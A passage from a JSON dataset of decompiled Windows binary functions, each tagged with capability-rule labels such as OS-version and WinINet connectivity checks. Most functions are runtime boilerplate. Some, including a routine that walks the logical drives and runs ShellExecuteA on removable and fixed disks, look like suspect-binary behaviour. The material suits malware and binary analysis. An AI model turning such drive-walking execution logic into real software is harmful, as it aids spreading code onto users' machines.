in_stack_fffffd44, in_stack_fffffd48);\n        noname_8 = 0x402094;\n        arg_24h = 0x40a963;\n        fcn.00407008(0x402094);\n        uVar10 = 0x40504c;\n        fcn.0040702c(0x40504c);\n        uVar9 = 0x40a977;\n        fcn.0040a082(uVar10, uVar12, uVar11, uVar7, uVar8, in_stack_fffffd24, in_stack_fffffd28, arg_24h, noname_8, \n                     arg_24h_00, noname_8_00, arg_24h_01, noname_8_01);\n        fcn.0040578a();\n        puVar6 = fcn.0040702c(0x4050c0);\n        if (0xf < puVar6[5]) {\n            puVar6 = *puVar6;\n        }\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)();\n        fcn.0040571f(1);\n        if (argv == 2) {\n            fcn.0040702c(puVar6[1]);\n            fcn.0040b44d(&stack0xfffffd08);\n            fcn.00406886(in_stack_fffffd08, uVar9, uVar10, uVar12, uVar11, uVar7);\n            fcn.0040571f(1);\n        }\n        else {\n            arg_8h = &stack0xfffffdcc;\n            uVar8 = 0x40a9ff;\n            fcn.00407008(arg_8h);\n            uVar7 = 0x401f44;\n            fcn.00407008(0x401f44);\n            fcn.0040b348(uVar7, in_stack_fffffcec, in_stack_fffffcf0, in_stack_fffffcf4, in_stack_fffffcf8, \n                         in_stack_fffffcfc, in_stack_fffffd00, uVar8, arg_8h, uVar9, uVar10, uVar12, uVar11);\n            fcn.00406f3d();\n        }\n        uVar9 = fcn.0040b68c();\n        fcn.0040b4c2(uVar9);\n        fcn.0040d730();\n        fcn.0040ae4f();\n        fcn.00407291();\n        fcn.0040d730();\n        fcn.00407dae(0x404684);\n        fcn.00407291();\n        fcn.00407d1a(0x402024, 0);\n        fcn.00407291();\n        fcn.0040d730();\n        fcn.00407dae(0x405190);\n        fcn.00407291();\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x4045c0, &stack0xfffffd44);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        uVar9 = 1;\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040748c(1);\n    }\n    else {\n        uVar8 = 0x405044;\n        fcn.0040702c(0x405044);\n        uVar7 = 0x40ab91;\n        fcn.0040a12b(uVar8, uVar9, uVar10, in_stack_fffffdbc, in_stack_fffffdc0, in_stack_fffffdc4);\n        fcn.00407291();\n        fcn.0040571f(1);\n        uVar11 = 0x40504c;\n        fcn.0040702c(0x40504c);\n        uVar12 = 0x40abc8;\n        fcn.0040a12b(uVar11, uVar7, uVar8, uVar9, uVar10, in_stack_fffffdbc);\n        fcn.00407291();\n        fcn.0040571f(1);\n        uVar10 = 0x405040;\n        fcn.0040702c(0x405040);\n        fcn.0040a12b(uVar10, uVar12, uVar11, uVar7, uVar8, uVar9);\n        fcn.00407291();\n        fcn.0040571f(1);\n        fcn.0040b139();\n        fcn.004081cb();\n        fcn.00408d4c(0);\n        fcn.00409263();\n        fcn.004092b9();\n        fcn.00409616();\n        fcn.004057c3();\n        fcn.00408f61(&stack0xfffffe94);\n        fcn.00405fd0();\n        fcn.0040af03();\n        fcn.0040b017();\n        fcn.0040578a();\n        puVar6 = fcn.0040702c(0x4050c0);\n        if (0xf < puVar6[5]) {\n            puVar6 = *puVar6;\n        }\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)();\n        fcn.0040571f(1);\n        if (argv == 2) {\n            fcn.0040702c(puVar6[1]);\n            fcn.0040b44d(&stack0xfffffd78);\n            fcn.00406886(in_stack_fffffd78, in_stack_fffffd7c, in_stack_fffffd80, in_stack_fffffd84, in_stack_fffffd88, \n                         in_stack_fffffd8c);\n            fcn.0040571f(1);\n        }\n        else {\n            fcn.00406f3d();\n        }\n        uVar9 = fcn.0040b68c();\n        fcn.0040b4c2(uVar9);\n        fcn.0040d730();\n        fcn.0040ae4f();\n        uStack472 = 0;\n        uStack488 = 0;\n        uStack468 = 0xf;\n        fcn.00407291();\n        fcn.0040d730();\n        fcn.00407dae(0x404684);\n        fcn.00407291();\n        fcn.00407d1a(0x402024, 0);\n        fcn.00407291();\n        fcn.0040d730();\n        fcn.00407dae(0x405190);\n        fcn.00407291();\n        (*_sym.imp.SHELL32.dll_ShellExecuteA)();\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        uVar9 = 1;\n        fcn.0040571f(1);\n        fcn.0040571f(1);\n        fcn.0040748c(1);\n    }\n    fcn.0040571f(1);\n    fcn.0040b864(uVar9);\n    return;\n}\n",
        "token_count": 3597
    },
    "0040b864": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b864(uint arg_8h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    int32_t in_ECX;\n    uint in_EDX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ushort in_ES;\n    ushort in_CS;\n    ushort in_SS;\n    ushort in_DS;\n    ushort in_FS;\n    ushort in_GS;\n    uint8_t in_AF;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint unaff_retaddr;\n    int32_t var_328h;\n    uint var_324h;\n    uint var_320h;\n    \n    if (in_ECX == *0x401304) {\n        return;\n    }\n    *0x413be0 = (in_NT & 1) * 0x4000 | SBORROW4(&stack0xfffffffc, 0x328) * 0x800 | (in_IF & 1) * 0x200 |\n                (in_TF & 1) * 0x100 | (&var_328h < 0) * 0x80 | (*0x10 == 0x32c) * 0x40 | (in_AF & 1) * 0x10 |\n                ((POPCOUNT(&var_328h & 0xff) & 1U) == 0) * 4 | &stack0xfffffffc < 0x328 | (in_ID & 1) * 0x200000 |\n                (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 | (in_AC & 1) * 0x40000;\n    *0x413be4 = &arg_8h;\n    *0x413b20 = 0x10001;\n    *0x413ac8 = 0xc0000409;\n    *0x413acc = 1;\n    var_328h = *0x401304;\n    var_324h = *0x401308;\n    *0x413ad4 = unaff_retaddr;\n    *0x413bac = in_GS;\n    *0x413bb0 = in_FS;\n    *0x413bb4 = in_ES;\n    *0x413bb8 = in_DS;\n    *0x413bbc = unaff_EDI;\n    *0x413bc0 = unaff_ESI;\n    *0x413bc4 = unaff_EBX;\n    *0x413bc8 = in_EDX;\n    *0x413bcc = in_ECX;\n    *0x413bd0 = in_EAX;\n    *0x413bd4 = unaff_EBP;\n    *0x413bd8 = unaff_retaddr;\n    *0x413bdc = in_CS;\n    *0x413be8 = in_SS;\n    *0x413b18 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    fcn.0040faea(1);\n    (*_sym.imp.KERNEL32.dll_SetUnhandledExceptionFilter)(0);\n    (*_sym.imp.KERNEL32.dll_UnhandledExceptionFilter)(0x402158);\n    if (*0x413b18 == 0) {\n        fcn.0040faea(1);\n    }\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0xc0000409);\n    (*_sym.imp.KERNEL32.dll_TerminateProcess)(uVar1);\n    return;\n}\n",
        "token_count": 818
    },
    "0040e62f": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e62f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint uVar3;\n    \n    if (arg_8h != 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_HeapFree)(*0x414458, 0, arg_8h);\n        if (iVar1 == 0) {\n            puVar2 = fcn.0040eb2d();\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n            uVar3 = fcn.0040eaeb(uVar3);\n            *puVar2 = uVar3;\n        }\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "0040e297": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Possible PIC construction at 0x0040e39d: Changing call to branch\n// WARNING: Removing unreachable block (ram,0x0040e3a2)\n// WARNING: Removing unreachable block (ram,0x0040e3d1)\n// WARNING: Removing unreachable block (ram,0x0040e3a8)\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040e297(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t iVar4;\n    code *pcVar5;\n    int32_t unaff_EBP;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040e440(0x413560, 0x20);\n    fcn.0040fd9b(8);\n    *(unaff_EBP + -4) = 0;\n    pcVar1 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if (*0x413e20 != 1) {\n        *0x413e1c = 1;\n        *0x413e18 = *(unaff_EBP + 0x10);\n        if (*(unaff_EBP + 0xc) == 0) {\n            piVar2 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x414928);\n            *(unaff_EBP + -0x30) = piVar2;\n            if (piVar2 != NULL) {\n                piVar3 = (*pcVar1)(*0x414924);\n                *(unaff_EBP + -0x2c) = piVar3;\n                *(unaff_EBP + -0x24) = piVar2;\n                *(unaff_EBP + -0x28) = piVar3;\n                while( true ) {\n                    piVar3 = piVar3 + -1;\n                    *(unaff_EBP + -0x2c) = piVar3;\n                    if (piVar3 < piVar2) break;\n                    iVar4 = fcn.0040ede8();\n                    if (*piVar3 != iVar4) {\n                        if (piVar3 < piVar2) break;\n                        pcVar5 = (*pcVar1)(*piVar3);\n                        iVar4 = fcn.0040ede8();\n                        *piVar3 = iVar4;\n                        (*pcVar5)();\n                        iVar4 = (*pcVar1)(*0x414928);\n                        piVar2 = (*pcVar1)(*0x414924);\n                        if ((*(unaff_EBP + -0x24) != iVar4) || (*(unaff_EBP + -0x28) != piVar2)) {\n                            *(unaff_EBP + -0x24) = iVar4;\n                            *(unaff_EBP + -0x30) = iVar4;\n                            *(unaff_EBP + -0x28) = piVar2;\n                            *(unaff_EBP + -0x2c) = piVar2;\n                            piVar3 = piVar2;\n                        }\n                        piVar2 = *(unaff_EBP + -0x30);\n                    }\n                }\n            }\n            *(unaff_EBP + -0x1c) = 0x401268;\n            while (*(unaff_EBP + -0x1c) < 0x40126c) {\n                if (**(unaff_EBP + -0x1c) != NULL) {\n                    (***(unaff_EBP + -0x1c))();\n                }\n                *(unaff_EBP + -0x1c) = *(unaff_EBP + -0x1c) + 4;\n            }\n        }\n        *(unaff_EBP + -0x20) = 0x401270;\n        while (*(unaff_EBP + -0x20) < 0x401274) {\n            if (**(unaff_EBP + -0x20) != NULL) {\n                (***(unaff_EBP + -0x20))();\n            }\n            *(unaff_EBP + -0x20) = *(unaff_EBP + -0x20) + 4;\n        }\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    if (*(unaff_EBP + 0x10) != 0) {\n        fcn.0040fcc2(8);\n    }\n    return;\n}\n",
        "token_count": 1016
    },
    "0041002c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041002c(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_1ch;\n    \n    if (*(unaff_EBP + -0x1c) != 0) {\n        fcn.0040fcc2(0);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "00410352": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.00410352(uint arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    uint unaff_EBX;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    var_20h = arg_8h;\n    var_1ch = arg_ch;\n    var_18h = fcn.0040ede8();\n    var_14h = 0;\n    if (*0x41472c == 0) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryW)(0x4033e0);\n        pcVar6 = _sym.imp.KERNEL32.dll_GetProcAddress;\n        if ((iVar1 == 0) ||\n           (iVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar1, 0x4033d4), \n           pcVar4 = _sym.imp.KERNEL32.dll_EncodePointer,  iVar2 == 0)) goto code_r0x004104af;\n        *0x41472c = (*_sym.imp.KERNEL32.dll_EncodePointer)(iVar2);\n        uVar3 = (*pcVar6)(iVar1, 0x4033c4);\n        *0x414730 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x4033b0);\n        *0x414734 = (*pcVar4)(uVar3);\n        uVar3 = (*pcVar6)(iVar1, 0x403394);\n        *0x41473c = (*pcVar4)(uVar3);\n        if (*0x41473c != 0) {\n            uVar3 = (*pcVar6)(iVar1, 0x40337c);\n            *0x414738 = (*pcVar4)(uVar3);\n        }\n    }\n    pcVar6 = _sym.imp.KERNEL32.dll_DecodePointer;\n    if ((*0x414738 == var_18h) || (*0x41473c == var_18h)) {\ncode_r0x0041045e:\n        if ((((*0x414730 != var_18h) && (pcVar4 = (*pcVar6)(*0x414730),  pcVar4 != NULL)) &&\n            (var_14h = (*pcVar4)(),  var_14h != 0)) &&\n           ((*0x414734 != var_18h && (pcVar4 = (*pcVar6)(*0x414734),  pcVar4 != NULL)))) {\n            var_14h = (*pcVar4)(var_14h);\n        }\n    }\n    else {\n        pcVar4 = (*_sym.imp.KERNEL32.dll_DecodePointer)(*0x414738);\n        pcVar5 = (*pcVar6)(*0x41473c);\n        if (((pcVar4 == NULL) || (pcVar5 == NULL)) ||\n           (((iVar1 = (*pcVar4)(),  iVar1 != 0 && (iVar1 = (*pcVar5)(iVar1, 1, &var_10h, 0xc, &var_24h),  iVar1 != 0))\n            && ((var_8h & 1) != 0)))) goto code_r0x0041045e;\n        arg_10h = arg_10h | 0x200000;\n    }\n    pcVar6 = (*pcVar6)(*0x41472c);\n    if (pcVar6 != NULL) {\n        (*pcVar6)(var_14h, var_20h, var_1ch, arg_10h);\n    }\ncode_r0x004104af:\n    fcn.0040b864(unaff_EBX);\n    return;\n}\n",
        "token_count": 924
    },
    "00411e0e": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.00411e0e(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint arg_8h, uint arg_ch, uint noname_17, uint noname_18, uint arg_18h, uint arg_1ch, \n            uint arg_20h)\n\n{\n    int32_t iVar1;\n    int32_t *in_FS_OFFSET;\n    uint *var_8h_3;\n    uint *var_ch_2;\n    uint var_10h_2;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    code *var_2ch;\n    uint *var_28h_2;\n    code *pcStack40;\n    uint32_t uStack36;\n    uint uStack32;\n    uint *puStack28;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uchar *var_8h_2;\n    int32_t var_4h_2;\n    \n    var_8h_2 = &stack0xfffffffc;\n    puStack16 = &stack0xffffffc0;\n    if (var_8h_3 == 0x123) {\n        *var_ch_2 = 0x411eb9;\n        var_38h = 1;\n    }\n    else {\n        pcStack40 = fcn.00411ee5;\n        uStack36 = *0x401304 ^ &fcn.00411e0e::var_28h_2;\n        uStack32 = var_24h;\n        puStack28 = var_ch_2;\n        uStack24 = var_20h;\n        uStack20 = var_1ch;\n        var_4h_2 = 0;\n        var_28h_2 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &fcn.00411e0e::var_28h_2;\n        var_34h = var_8h_3;\n        var_30h = var_10h_2;\n        iVar1 = fcn.0040ef98();\n        var_2ch = *(iVar1 + 0x80);\n        (*var_2ch)(*var_8h_3, &fcn.00411e0e::var_34h);\n        var_38h = 0;\n        if (var_4h_2 == 0) {\n            *in_FS_OFFSET = var_28h_2;\n        }\n        else {\n            *var_28h_2 = **in_FS_OFFSET;\n            *in_FS_OFFSET = var_28h_2;\n        }\n    }\n    return var_38h;\n}\n",
        "token_count": 726
    },
    "00412392": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.00412392(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.0040e440(0x413960, 0x10);\n    iVar1 = *(unaff_EBP + 0x10);\n    iVar2 = *(unaff_EBP + 8);\n    if (*(iVar1 + 4) < 0x81) {\n        iVar5 = *(iVar2 + 8);\n    }\n    else {\n        iVar5 = *(iVar2 + 8);\n    }\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar4 = fcn.0040ef98();\n    *(iVar4 + 0x90) = *(iVar4 + 0x90) + 1;\n    *(unaff_EBP + -4) = 0;\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar1 + 4) <= iVar5)) {\n            fcn.0040fe1a();\n        }\n        iVar4 = *(iVar1 + 8);\n        iVar3 = *(iVar4 + iVar5 * 8);\n        *(unaff_EBP + -0x20) = iVar3;\n        *(unaff_EBP + -4) = 1;\n        if (*(iVar4 + 4 + iVar5 * 8) != 0) {\n            *(iVar2 + 8) = iVar3;\n            fcn.00412f90(*(*(iVar1 + 8) + 4 + iVar5 * 8), iVar2, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar3;\n        iVar5 = iVar3;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.00412454();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0040fe1a();\n    }\n    *(iVar2 + 8) = iVar5;\n    fcn.0040e485();\n    return;\n}\n",
        "token_count": 570
    },
    "00412454": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.00412454(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040ef98();\n    if (0 < *(iVar1 + 0x90)) {\n        iVar1 = fcn.0040ef98();\n        *(iVar1 + 0x90) = *(iVar1 + 0x90) + -1;\n    }\n    return;\n}\n",
        "token_count": 88
    },
    "0041271b": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041271b(uint noname_0, uint noname_1, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x24);\n    fcn.0041204a(*(unaff_EBP + -0x28));\n    iVar1 = fcn.0040ef98();\n    *(iVar1 + 0x88) = *(unaff_EBP + -0x2c);\n    iVar1 = fcn.0040ef98();\n    *(iVar1 + 0x8c) = *(unaff_EBP + -0x30);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((iVar1 = unaff_ESI[5],  iVar1 == 0x19930520 || ((iVar1 == 0x19930521 || (iVar1 == 0x19930522)))))) &&\n       ((*(unaff_EBP + -0x34) == 0 && (*(unaff_EBP + -0x1c) != 0)))) {\n        iVar1 = fcn.00412023(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.004124b3(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 381
    },
    "00407070": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407070(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *unaff_ESI;\n    \n    iVar2 = unaff_ESI[4];\n    if (-iVar2 - 1U < 2) {\n        iVar2 = fcn.0040b79e(0x404554);\n    }\n    cVar1 = fcn.004075c0(0);\n    if (cVar1 != '\\0') {\n        puVar3 = unaff_ESI;\n        if (0xf < unaff_ESI[5]) {\n            puVar3 = *unaff_ESI;\n        }\n        *(puVar3 + unaff_ESI[4]) = arg_8h;\n        unaff_ESI[4] = iVar2 + 1;\n        if (0xf < unaff_ESI[5]) {\n            unaff_ESI = *unaff_ESI;\n        }\n        *(unaff_ESI + iVar2 + 1) = 0;\n    }\n    return;\n}\n",
        "token_count": 239
    },
    "00407179": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040718e)\n\nint32_t __cdecl fcn.00407179(uint arg_8h)\n\n{\n    char **in_EAX;\n    int32_t iVar1;\n    char **ppcVar2;\n    char **ppcVar3;\n    \n    if (in_EAX[4] != NULL) {\n        ppcVar3 = in_EAX;\n        if (0xf < in_EAX[5]) {\n            ppcVar3 = *in_EAX;\n        }\n        ppcVar3 = ppcVar3 + in_EAX[4] + -1;\n        while( true ) {\n            if ((*ppcVar3 == arg_8h) && (iVar1 = fcn.0040c1d1(ppcVar3, &arg_8h, 1),  iVar1 == 0)) {\n                if (0xf < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                return ppcVar3 - in_EAX;\n            }\n            ppcVar2 = in_EAX;\n            if (0xf < in_EAX[5]) {\n                ppcVar2 = *in_EAX;\n            }\n            if (ppcVar3 == ppcVar2) break;\n            ppcVar3 = ppcVar3 + -1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 304
    },
    "0040758c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040758c(int32_t arg_8h)\n\n{\n    uint *in_EAX;\n    int32_t in_ECX;\n    char in_DL;\n    \n    if (arg_8h == 1) {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        *(in_EAX + in_ECX) = in_DL;\n    }\n    else {\n        if (0xf < in_EAX[5]) {\n            in_EAX = *in_EAX;\n        }\n        fcn.0040d7e0(in_EAX + in_ECX, in_DL, arg_8h);\n    }\n    return;\n}\n",
        "token_count": 154
    },
    "004081cb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.004081cb(void)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint in_stack_ffffff48;\n    uint var_b0h;\n    uint32_t var_ach;\n    uint32_t lpTotalNumberOfBytes;\n    int32_t var_a4h;\n    uint32_t lpFreeBytesAvailableToCaller;\n    int32_t var_9ch;\n    int32_t var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    uint var_74h;\n    uint var_58h;\n    uint *var_3ch;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint *var_20h;\n    uint var_10h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetLogicalDrives)();\n    var_98h = 0;\n    do {\n        if ((uVar1 >> (var_98h & 0x1f) & 1) != 0) {\n            var_2ch = 0;\n            var_ach = var_ach & 0xffffff00 | var_98h + 0x41;\n            var_28h = 0xf;\n            var_3ch = var_3ch & 0xffffff00;\n            fcn.004087fe(var_ach);\n            var_10h = 0;\n            var_ch = 0xf;\n            var_20h = var_20h & 0xffffff00;\n            fcn.0040d730(0x404578);\n            fcn.004089c6();\n            fcn.00407d1a(&var_3ch, 0);\n            fcn.0040d730(0x404578);\n            fcn.00407dae(0x404578);\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &var_20h;\n            }\n            var_94h = (*_sym.imp.KERNEL32.dll_GetDriveTypeA)(puVar3);\n            fcn.0040571f(1);\n            if (var_94h == 2) {\n                uVar5 = 0x40457c;\n                puVar3 = &var_3ch;\n                uVar4 = 0x404590;\n                uVar2 = fcn.00408978(0x404598);\n                fcn.00407c84(uVar2, uVar4);\n                uVar2 = fcn.00407c1c(&var_90h, puVar3);\n                puVar3 = fcn.00407c84(uVar2, uVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x4045c0, puVar3, 0, 0);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                uVar5 = 0x4045c8;\n                puVar3 = &var_3ch;\n                uVar4 = 0x404590;\n                uVar2 = fcn.00408978(0x404598);\n                fcn.00407c84(uVar2, uVar4);\n                uVar2 = fcn.00407c1c(&var_74h, puVar3);\n                puVar3 = fcn.00407c84(uVar2, uVar5);\n                if (0xf < puVar3[5]) {\n                    puVar3 = *puVar3;\n                }\n                (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, 0, 0x4045c0, puVar3, 0, 0);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040571f(1);\n                fcn.0040d730(0x404578);\n                fcn.00407dae(0x404578);\n                fcn.0040723c();\n                fcn.0040702c(0x4045e0);\n                fcn.0040723c();\n                fcn.0040571f(1);\n            }\n            if (var_94h == 3) {\n                uVar5 = 0x40457c;\n                puVar3 = &var_3ch;\n                uVar4 = 0x404590;\n                uVar2 = fcn.00408978(0x404598);\n                fcn.00407c84(uVar2, 